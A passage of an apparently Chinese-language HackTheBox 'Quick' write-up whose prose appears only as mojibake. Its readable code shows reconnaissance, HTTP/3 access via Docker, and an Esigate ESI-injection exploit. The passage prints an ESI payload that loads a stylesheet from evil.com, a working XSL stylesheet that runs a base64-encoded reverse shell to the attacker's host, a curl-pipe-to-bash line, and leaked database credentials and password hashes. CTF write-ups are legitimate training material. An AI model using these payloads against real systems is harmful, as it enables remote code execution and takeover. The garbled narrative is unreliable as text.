alt></p><p>ä¼¼ä¹é‡Œé¢çš„å…¬å¸è·Ÿå‰é¢çš„äººåå¤‡æ³¨çš„å…¬å¸æœ‰ç›¸åŒçš„åœ°æ–¹ã€‚ç›®å‰åªèƒ½è¯´å¤§è‡´å¯ä»¥æ”¶é›†ä¸€äº›ä¿¡æ¯ã€‚<br>è®¿é—®<code>login.php</code>å‘ç°éœ€è¦ç”¨æˆ·åè·Ÿå¯†ç ã€‚ä¸è¿‡ï¼Œæ­¤å¤„çš„ç”¨æˆ·åè¦æ±‚ä¸ºé‚®ç®±ç™»å½•ã€‚å¯†ç åˆ™æ²¡æœ‰ä»€ä¹ˆé€éœ²çš„ä¿¡æ¯ã€‚</p><p>webé¡µé¢çš„ä¿¡æ¯æ”¶é›†å®Œäº†ï¼Œå°±åº”è¯¥è¯•è¯•<code>https://portal.quick.htb</code>äº†</p><p>ç„¶è€Œå¥‡æ€ªçš„æ˜¯,æˆ‘ä»¬æ ¹æœ¬æ²¡æœ‰åŠæ³•è®¿é—®è¿™ä¸ªç½‘é¡µ(åœ¨ä¿®æ”¹äº†<code>/etc/hosts</code>çš„å‰æä¸‹)ã€‚å°è¯•ç›´æ¥curlä¹ŸåŒæ ·æ— æœã€‚è¿™æ—¶ç›´æ¥é™·å…¥åƒµå±€ã€‚</p><p>åœ¨é€›äº†ä¸€åœˆhtbçš„è®ºå›åï¼Œå‘ç°å¤§å®¶æåˆ°äº†é‡æ–°buildå·¥å…·è¿™ä¸ªå…³é”®ä¿¡æ¯ã€‚å¹¶ä¸”æåˆ°äº†ï¼Œå¦‚æœè®¿é—®ä¸äº†è¿™ä¸ªé¡µé¢ï¼Œæ˜¯å› ä¸ºæµè§ˆå™¨æ— æ³•ç†è§£æ”¶åˆ°çš„ä¿¡æ¯ã€‚æ‰€ä»¥è®¿é—®ä¸äº†ã€‚å¹¶ä¸”æœ€å¥½å°è¯•å…¶ä»–protocol.</p><p>åœ¨ç•™æ„åˆ°protocolè¿™ä¸ªå…³é”®è¯åï¼Œæˆ‘å¼€å§‹å°è¯•è·‘ä¸€éudpç«¯å£çš„nmap</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Nmap 7.80 scan initiated Fri Jun 19 20:33:51 2020 as: nmap -sU -oA nmap/quick-udp 10.10.10.186</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> portal.quick.htb (10.10.10.186)</span><br><span class="line">Host is up (0.43s latency).</span><br><span class="line">Not shown: 999 closed ports</span><br><span class="line">PORT    STATE         SERVICE</span><br><span class="line">443/udp open|filtered https</span><br><span class="line"></span><br><span class="line"><span class="comment"># Nmap done at Fri Jun 19 20:50:40 2020 -- 1 IP address (1 host up) scanned in 1008.38 seconds</span></span><br></pre></td></tr></table></figure><p>åŸæ¥åœ¨udpçš„443ç«¯å£æœ‰httpsæœåŠ¡ã€‚çœ‹æ¥å¤§æ¦‚ç‡å°±æ˜¯æˆ‘ä»¬ä¹‹å‰çš„ç½‘ç«™äº†ã€‚æ­¤æ—¶æœç´¢ç›¸å…³ä¿¡æ¯ï¼Œä¼šå‘ç°è¿™åº”è¯¥æ˜¯HTTP/3åè®®ã€‚å› ä¸ºHTTP/3çš„ä¸€ä¸ªé‡è¦ç‰¹å¾å°±æ˜¯å°†å¼ƒç”¨TCPåè®®ï¼Œæ”¹ä¸ºä½¿ç”¨åŸºäºUDPåè®®çš„QUICåè®®å®ç°ã€‚<br>å¯ä»¥çœ‹ä¸‹ç»´åŸºè·Ÿè¿™ç¯‡æ–‡ç« ã€‚<br><a href="https://www.slideshare.net/bagder/http3-in-curl" target="_blank" rel="noopener">http3-in-curl</a></p><p>http/3åè®®è™½ç„¶æ˜¯æ–°è¶‹åŠ¿ï¼Œä½†æ˜¯ç›®å‰èƒ½å”¯ä¸€æœ‰æ•ˆè¿æ¥çš„å·¥å…·è¿˜æ˜¯åªæœ‰curl.æ‰€ä»¥æˆ‘çŒœæµ‹è®ºå›é‡Œå¤§å®¶æåˆ°çš„å°±æ˜¯é‡æ–°ç¼–è¯‘curlä»¥æ”¯æŒhttp3.</p><p>ç„¶è€Œè¿™ä¸€æ­¥ååˆ†è€—æ—¶é—´ï¼Œå› ä¸ºå¿…é¡»è¦ä¸‹<code>Quiche</code>é‡æ–°ç¼–è¯‘ï¼Œä¸‹<code>brew</code>æ¥è¿›è¡ŒåŒ…ç®¡ç†â€¦â€¦æ€»ä¹‹æˆ‘è¿brewéƒ½æ²¡ä¸‹å®Œå°±æ”¾å¼ƒäº†è¿™ä¸ªé€‰æ‹©ï¼Œå› ä¸ºå›½å†…å®åœ¨å¤ªæ…¢äº†ï¼Œæ¢äº†gitæºååˆå› ä¸ºå…¶ä»–æºç»§ç»­é¾Ÿé€Ÿä¸‹è½½â€¦è¿™æ—¶æˆ‘åœ¨æœç´¢å†…å®¹ä¸­æ³¨æ„åˆ°dockeræœ‰ç°æˆçš„é•œåƒã€‚äºæ˜¯æœæ–­æ¢dockerè¿›è¡Œcurlã€‚(dockerçš„æœ€å¤§ä»·å€¼å°±æ˜¯ä¸ºæˆ‘ä»¬èŠ‚çœäº†é…ç¯å¢ƒçš„å¤§æŠŠæ—¶é—´)<br>pullä¸€ä¸ª<code>ymuski/curl-http3</code>é•œåƒ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -it --rm ymuski/curl-http3 curl -V</span><br></pre></td></tr></table></figure><p>æ£€æŸ¥ä¸‹æ”¯æŒhttp3.è¿™æ ·å°±å¯ä»¥ç”¨<code>--http3</code>æ¥è®¿é—®ç½‘å€äº†</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -it --rm ymuski/curl-http3 curl https://10.10.10.186 --http3</span><br></pre></td></tr></table></figure><p><img src="/2020/06/23/hackthebox-Quick-%E4%B8%80%E6%AC%A1%E8%89%B0%E9%9A%BE%E7%9A%84%E6%B8%97%E9%80%8F/2.PNG" class="lazyload" data-srcset="2.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>å‘ç°å‡ ä¸ªé“¾æ¥ã€‚ä¸€ä¸ªä¸ªè®¿é—®åå‘ç°docsæ–‡æ¡£æœ‰ä¸¤ä¸ªpdfã€‚</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Quick | References<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"docs/QuickStart.pdf"</span>&gt;</span>Quick-Start Guide<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"docs/Connectivity.pdf"</span>&gt;</span>Connectivity Guide<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>å¼€å§‹æœæ–­å°è¯•ç›´æ¥<code>-o</code>è¾“å‡ºï¼Œä½†æ˜¯å´æå¿˜äº†ï¼Œè¿™é‡Œæ˜¯è°ƒç”¨çš„dockeræ‰§è¡Œå‘½ä»¤ã€‚é‚£ä¹ˆæˆ‘ä»¬çš„è¾“å‡ºåœ¨é•œåƒé‡Œé¢ã€‚æ‰€ä»¥æˆ‘å¾—æŒ‚è½½ä¸€ä¸ªç›®å½•æ¥è·å–è¾“å‡ºçš„pdf</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -it --rm -v /mnt/curl:/tmp ymuski/curl-http3 curl 10.10.10.186 --http3 -o /tmp/xxx.pdf</span><br></pre></td></tr></table></figure><p>åœ¨å…¶ä¸­ä¸€ä¸ªpdfä¸­å¾—åˆ°å…³é”®ä¿¡æ¯ã€‚ä¹Ÿå°±æ˜¯å¯†ç ã€‚<br><img src="/2020/06/23/hackthebox-Quick-%E4%B8%80%E6%AC%A1%E8%89%B0%E9%9A%BE%E7%9A%84%E6%B8%97%E9%80%8F/3.PNG" class="lazyload" data-srcset="3.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>é‚£ä¹ˆæ¥ä¸‹æ¥å°±æ˜¯å°è¯•ç™»å½•äº†ã€‚è¿™ä¹Ÿæ˜¯èµ·æ‰‹å¼è¿™é‡Œåˆä¸€ä¸ªéš¾ç‚¹ã€‚åŸå…ˆhtbçš„é‚®ç®±åŸºæœ¬ä¸Šéƒ½æ˜¯<code>admin@{boxçš„hostname}.htb</code>è¿™ç§å½¢å¼çš„ã€‚ä½†æ˜¯æ­¤å¤„å¸¸è§„å°è¯•éƒ½ä¸èµ·æ•ˆæœã€‚äºæ˜¯åªèƒ½æ‰‹åŠ¨å†™è„šæœ¬ç»„åˆä¸‹ä¹‹å‰çš„ä¿¡æ¯ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">list=[]</span><br><span class="line">users=[<span class="string">'tim'</span>,<span class="string">'roy'</span>,<span class="string">'elisa'</span>,<span class="string">'james'</span>,<span class="string">'mike'</span>,<span class="string">'jane'</span>,<span class="string">'john'</span>]</span><br><span class="line">postfix=[<span class="string">'qconsulting.co.uk'</span>,<span class="string">'darkwing.com'</span>,<span class="string">'wink.co.uk'</span>,<span class="string">'lazycoop.cn'</span>,<span class="string">'scoobydoo.it'</span>,<span class="string">'penguincrop.fr'</span>]</span><br><span class="line">postfix2=[<span class="string">'qconsulting.co.uk'</span>,<span class="string">'darkwing.com'</span>,<span class="string">'wink.co.uk'</span>,<span class="string">'lazycoop.com.cn'</span>,<span class="string">'scoobydoo.co.it'</span>,<span class="string">'penguincrop.co.fr'</span>]</span><br><span class="line">postfix3=[<span class="string">'qconsulting.htb.uk'</span>,<span class="string">'darkwing.htb'</span>,<span class="string">'wink.htb.uk'</span>,<span class="string">'lazycoop.htb.cn'</span>,<span class="string">'scoobydoo.htb.it'</span>,<span class="string">'penguincrop.htb.fr'</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">quick</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> list</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> users:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> postfix:</span><br><span class="line">            list.append(i+<span class="string">'@'</span>+j)</span><br><span class="line">    <span class="keyword">return</span> list</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">quick2</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> list</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> users:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> postfix2:</span><br><span class="line">            list.append(i+<span class="string">'@'</span>+j)</span><br><span class="line">    <span class="keyword">return</span> list</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">quick3</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> list</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> users:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> postfix3:</span><br><span class="line">            list.append(i+<span class="string">'@'</span>+j)</span><br><span class="line">    <span class="keyword">return</span> list</span><br><span class="line"></span><br><span class="line">f=open(<span class="string">'creds.txt'</span>,<span class="string">'w'</span>)</span><br><span class="line"><span class="keyword">for</span> email <span class="keyword">in</span> quick():</span><br><span class="line">    f.write(email+<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> email <span class="keyword">in</span> quick2():</span><br><span class="line">    f.write(email+<span class="string">'\n'</span>)</span><br><span class="line"><span class="keyword">for</span> email <span class="keyword">in</span> quick3():</span><br><span class="line">    f.write(email+<span class="string">'\n'</span>)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><p>æœ€åå°è¯•å‡ºç»“æœåæ‰å‘ç°å…¶å®ä¸éœ€è¦è¿‡å¤šå°è¯•çš„ã€‚ä½†æ˜¯é‡ç‚¹(éš¾ç‚¹)å°±åœ¨äºï¼Œå®ƒçš„é‚®ç®±æ ¼å¼éå¸¸ç±»ä¼¼çœŸå®çš„ä¼ä¸šé‚®ç®±ã€‚å‰é¢æˆ‘ä»¬ä¸»é¡µé¢çš„ä¿¡æ¯ç»“åˆèµ·æ¥åï¼Œå…¶å®æ¯ä¸ªäººåå¯¹åº”çš„å…¬å¸ï¼Œå›½å®¶éƒ½æ˜¯ç¡®å®šçš„ã€‚æ‰€ä»¥æˆ‘ä»¬ä¸»è¦æ³¨æ„é‡‡ç”¨äºŒçº§åŸŸåå³å¯ã€‚ä¹Ÿå°±æ˜¯è·Ÿåœ¨å…¬å¸ååçš„<code>.co.fr</code>,<code>.co.it</code>ç­‰ç­‰ã€‚</p><p>å¾—åˆ°ç”¨æˆ·<code>elisa</code>æˆåŠŸç™»é™†å,æˆ‘ä»¬å°±è¦å‡†å¤‡ç¬¬ä¸‰éƒ¨åˆ†çš„åˆ©ç”¨äº†ã€‚è¿™é‡Œæˆ‘ç›´è§‰çŒœæµ‹åº”è¯¥å¯ä»¥RCE,å› ä¸ºhtbçš„é¶æœºå¦‚æœæ²¡æ³•getshellçš„è¯è¿åé¢çš„ææƒéƒ½åšä¸åˆ°ã€‚å‡ºäºç›´è§‰ä»¥åŠæœ€æ—©çš„ä¿¡æ¯æ”¶é›†ï¼Œæˆ‘è®¤ä¸ºè¿™é‡Œåº”è¯¥æ˜¯ä»headerä¸­æ³„éœ²çš„ä¿¡æ¯ä¸‹æ‰‹<br><img src="/2020/06/23/hackthebox-Quick-%E4%B8%80%E6%AC%A1%E8%89%B0%E9%9A%BE%E7%9A%84%E6%B8%97%E9%80%8F/4.PNG" class="lazyload" data-srcset="4.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>æ³¨æ„åˆ°<code>X-Powered-By: Esigate</code>åç›´æ¥æœç´¢ç›¸å…³ä¿¡æ¯ã€‚äº†è§£åˆ°è¿™æ˜¯ä¸€ä¸ªæ¨¡æ¿ç›¸å…³çš„javaæœåŠ¡ã€‚å¯ä»¥èµ·åˆ°æ­é…phpcmså¹¶ä¸”å°†htmlç‰‡æ®µè¿›è¡Œæ•´åˆçš„ä½œç”¨ã€‚å¹¶ä¸”è¿›ä¸€æ­¥äº†è§£åå‘ç°å­˜åœ¨RCEæ¼æ´ã€‚</p><p>æ‰¾äº†å¥½å‡ ç¯‡æ–‡ç« éƒ½æ²¡æœ‰å…³é”®ä»£ç ã€‚åªæœ‰è¿™ç¯‡æåˆ°äº†<a href="https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/" target="_blank" rel="noopener">https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/</a></p><p>è§¦å‘çš„payloadå¦‚ä¸‹ï¼Œæ˜¾ç„¶ä¹Ÿæ˜¯å› ä¸ºå¼•å…¥äº†å¤–éƒ¨çš„æ¶æ„xslå¯¼è‡´RCEã€‚</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">esi:include</span> <span class="attr">src</span>=<span class="string">"http://website.com/"</span> <span class="attr">stylesheet</span>=<span class="string">"http://evil.com/esi.xsl"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">esi:include</span>&gt;</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘æ³¨æ„åˆ°å‰é¢çš„srcæ˜¯website.comæ‰€ä»¥æˆ‘åœ¨ä½¿ç”¨è‡ªå·±çš„payloadæ—¶å°†å…¶æ”¹ä¸ºäº†<code>10.10.10.186:9001</code>ã€‚åæ¥ä¹Ÿè¯æ˜å¦‚æœä¸æ”¹çš„è¯ï¼Œè§¦å‘æ—¶ä¼šå‡ºç°<code>error retrieving url</code>çš„æŠ¥é”™ã€‚</p><p>æ¥ä¸‹æ¥åˆ™æ˜¯å°è¯•å¦‚ä½•è§¦å‘çš„é—®é¢˜ã€‚è¿™é‡Œæˆ‘æŒ‰æ‰“CTFçš„ç›´è§‰è®¤ä¸ºåº”è¯¥æ˜¯<code>ticket.php</code>ä¼ payload.<code>search.php</code>ä¼ searchå‚æ•°è¿›è¡Œè§¦å‘ã€‚å½“ç„¶ç½‘é¡µä¹Ÿæé†’äº†ï¼Œå½“ä½ ä¼ å®Œticketåä¼šè¿”å›ä¸€ä¸ªé¢„å…ˆç½®å¥½çš„ticketidã€‚åªè¦åœ¨<code>search.php</code>æœç´¢å¯¹åº”idå³å¯ã€‚</p><p>è¿™é‡Œè¿˜æœ‰ä¸€ä¸ªå°å‘ã€‚é‚£å°±æ˜¯javaçš„å‘½ä»¤æ‰§è¡Œé—®é¢˜ã€‚å¼€å§‹å°è¯•è§¦å‘æ—¶å‘ç°ä¸»è¦é—®é¢˜æ˜¯ï¼š</p><ul><li>ä¸€ä¸ªticketä¼ ä¸€æ¬¡åå°±å¤±æ•ˆäº†ã€‚å¯¼è‡´æˆ‘æ¯æ¬¡å¾—æ›´æ”¹xslçš„åå­—ã€‚</li><li>å‘½ä»¤æ‰§è¡Œ<code>curl 10.10.10.14.40|bash</code>å¤±è´¥ã€‚ä¼°è®¡åˆæ˜¯javaçš„é”…ã€‚</li></ul><p>å¦‚æœç¨å¾®è¿‡ä¸€éä¸Šé¢é‚£ç¯‡æ–‡ç« ä¸­çš„xsl.ä¼šå‘ç°è‚¯å®šæ˜¯è°ƒç”¨äº†<code>java.lang.Runtime.getRuntime().exec()</code>æ¥æ‰§è¡Œå‘½ä»¤çš„ã€‚æ‰€ä»¥è‚¯å®šå­˜åœ¨å•æ¡å‘½ä»¤ç‰¹æ®Šå­—ç¬¦è¿‡ä¸å»çš„é—®é¢˜ã€‚å½“ç„¶è§£å†³æ–¹æ³•åœ¨åš<code>vulhub</code>å„ç§javaååºåˆ—åŒ–æ—¶å°±ç”¨çƒ‚äº†ã€‚ä½¿ç”¨ç¼–ç ç»•è¿‡å³å¯ã€‚<br><a href="http://jackson-t.ca/runtime-exec-payloads.html" target="_blank" rel="noopener">http://jackson-t.ca/runtime-exec-payloads.html</a></p><p>æœ€åæˆ‘çš„xsl payload</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" ?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:stylesheet</span> <span class="attr">version</span>=<span class="string">"1.0"</span> <span class="attr">xmlns:xsl</span>=<span class="string">"http://www.w3.org/1999/XSL/Transform"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:output</span> <span class="attr">method</span>=<span class="string">"xml"</span> <span class="attr">omit-xml-declaration</span>=<span class="string">"yes"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:template</span> <span class="attr">match</span>=<span class="string">"/"</span></span></span><br><span class="line"><span class="tag"><span class="attr">xmlns:xsl</span>=<span class="string">"http://www.w3.org/1999/XSL/Transform"</span></span></span><br><span class="line"><span class="tag"><span class="attr">xmlns:rt</span>=<span class="string">"http://xml.apache.org/xalan/java/java.lang.Runtime"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:variable</span> <span class="attr">name</span>=<span class="string">"cmd"</span>&gt;</span>&lt;![CDATA[bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40MC85MDAxIDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;]]&gt;<span class="tag">&lt;/<span class="name">xsl:variable</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:variable</span> <span class="attr">name</span>=<span class="string">"rtObj"</span> <span class="attr">select</span>=<span class="string">"rt:getRuntime()"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:variable</span> <span class="attr">name</span>=<span class="string">"process"</span> <span class="attr">select</span>=<span class="string">"rt:exec($rtObj, $cmd)"</span>/&gt;</span></span><br><span class="line">Process: <span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">"$process"</span>/&gt;</span></span><br><span class="line">Command: <span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">"$cmd"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">xsl:template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">xsl:stylesheet</span>&gt;</span></span><br></pre></td></tr></table></figure><p>å…ˆraiseä¸€ä¸ªticketåå‡†å¤‡å¥½ç›‘å¬ï¼Œsearch.phpä¼ å€¼ç›´æ¥è§¦å‘<br><img src="/2020/06/23/hackthebox-Quick-%E4%B8%80%E6%AC%A1%E8%89%B0%E9%9A%BE%E7%9A%84%E6%B8%97%E9%80%8F/5.PNG" class="lazyload" data-srcset="5.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>åˆ°æ­¤ä¸ºæ­¢å³å¯å¼¹åˆ°ç”¨æˆ·samçš„shellã€‚æ‹¿åˆ°user.txt</p><p>ä¸Šé¢ä¸€å¥—æµç¨‹èµ°ä¸‹æ¥åèŠ±äº†å¿«æœ‰7ä¸ªå°æ—¶ã€‚åªèƒ½ç®—æ˜¯é…ç¯å¢ƒ(ç”šè‡³è¿˜æ²¡é…æˆ)è·ŸçŒœç”¨æˆ·åçš„é”…ã€‚ä½†åŒæ—¶ä¹Ÿè¡¨ç°å‡º<code>enumeration</code>çš„è¿‡ç¨‹æœ‰å¤šé‡è¦ã€‚å¦åˆ™ç”šè‡³ä¸èƒ½æ­£å¸¸è¿›è¡Œåé¢çš„ææƒã€‚javaçš„å‘½ä»¤æ‰§è¡Œè¿™ä¸ªå°trickå¯¹äºæ–°æ‰‹è€Œè¨€ä¹Ÿè®¸å¾ˆå‘ã€‚ä½†æ˜¯ä»ç„¶æ˜¯æœ‰æ–¹æ³•çš„ã€‚æ¯”å¦‚wgetä¸€ä¸ªnetcatè¿‡å»å†æ‰§è¡Œ(windowså¸¸è§„æ“ä½œï¼Œå°¤å…¶æ˜¯åœ¨windowsdefenderæ—¥æ¸å¼ºå¤§çš„ä»Šå¤©)ã€‚å‡å¦‚ç†Ÿæ‚‰javaçš„è¯åˆ™åº”è¯¥å¾ˆå¿«å°±èƒ½æ„é€ å‡ºå¼¹shellçš„payload.ä¸è‡³äºå¡åœ¨RCEå´æ— æ³•getshell.</p><h2 id="privesc-to-srvadm"><a href="#privesc-to-srvadm" class="headerlink" title="privesc to srvadm"></a>privesc to srvadm</h2><p>å¾—åˆ°ç”¨æˆ·samåå‡†å¤‡å¼€å§‹ææƒã€‚é¦–å…ˆæ˜¯å¸¸è§„çš„<code>linpeas.sh</code>ä¼ åˆ°é¶æœºä¸Šæ‰«ä¸€éã€‚æ¥ç€æ˜¯<code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code>ç»´æŒshell.æ¯•ç«Ÿä¸€å¥—æµç¨‹ä¸‹æ¥getshellä¹Ÿä¸æ˜¯é‚£ä¹ˆè¿…é€Ÿçš„ã€‚(å½“ç„¶å¯ä»¥å†™ä¸ªsshå…¬é’¥ï¼Œå°±æ˜¯æˆ‘æå¿˜äº†2333)</p><p>è„šæœ¬æ‰«è¿‡ä¸€éåå¹¶æ²¡æœ‰ä»€ä¹ˆæ”¶è·ã€‚å€’æ˜¯åœ¨<code>html</code>çš„æºç é‡Œæ‰¾åˆ°äº†phpçš„<code>db.php</code>æ³„éœ²äº†æ•°æ®åº“ä¿¡æ¯</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$conn = <span class="keyword">new</span> mysqli(<span class="string">"localhost"</span>,<span class="string">"db_adm"</span>,<span class="string">"db_p4ss"</span>,<span class="string">"quick"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ç™»å½•mysqlä»usersè¡¨é‡Œæ‹¿åˆ°ä¸¤ä¸ªç”¨æˆ·åŠå„è‡ªå¯†ç çš„hash</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">| Elisa        | elisa@wink.co.uk | c6c35ae1f3cb19438e0199cfa72a9d9d |</span><br><span class="line">| Server Admin | srvadm@quick.htb | e626d51f8fbfd1124fdea88396c35d05 |</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶é¶æœºè¿˜å‰©ä¸‹ä¸€ä¸ªè¦ææƒçš„ç”¨æˆ·<code>srvadm</code>ã€‚è¿™é‡Œæ³„éœ²äº†å¯†ç ï¼Œå½“ç„¶è¦å»phpæºç é‡Œçœ‹çœ‹å¯†ç æ˜¯æ€ä¹ˆä¸hashè¿›è¡Œå¯¹æ¯”çš„<br>login.phpä¸­</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">password=md5(crypt($password,<span class="string">'fa'</span>))</span><br></pre></td></tr></table></figure><p>æ—¢ç„¶ç›å€¼ä»¥åŠåŠ 